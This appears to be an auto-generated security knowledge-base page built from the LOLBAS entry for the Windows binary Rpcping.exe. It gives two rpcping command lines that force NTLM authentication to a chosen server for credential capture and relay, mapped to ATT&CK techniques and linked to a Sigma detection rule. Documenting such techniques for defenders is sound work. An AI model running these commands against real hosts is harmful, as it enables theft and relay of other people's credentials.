---
title: "Rpcping.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Rpcping.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Rpcping.exe"
functions:
  - "Credentials"
attack_technique_ids:
  - "T1003"
  - "T1187"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Used to verify rpc connection

## Paths

- `C:\Windows\System32\rpcping.exe`
- `C:\Windows\SysWOW64\rpcping.exe`

## Commands

### 1. Credentials

Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.

```cmd
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
```

- Use Case: Capture credentials on a non-standard port
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping|T1003: OS Credential Dumping]]

### 2. Credentials

Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).

```cmd
rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
```

- Use Case: Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1187-forced_authentication|T1187: Forced Authentication]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rpcping_credential_capture.yml

## Resources

- {'Link': 'https://github.com/vysec/RedTips'}
- {'Link': 'https://twitter.com/vysecurity/status/974806438316072960'}
- {'Link': 'https://twitter.com/vysecurity/status/873181705024266241'}
- {'Link': 'https://twitter.com/splinter_code/status/1421144623678988298'}

## Acknowledgements

- {'Person': 'Casey Smith', 'Handle': '@subtee'}
- {'Person': 'Vincent Yiu', 'Handle': '@vysecurity'}
- {'Person': 'Antonio Cocomazzi', 'Handle': '@splinter_code'}
- {'Person': 'ap', 'Handle': '@decoder_it'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml)
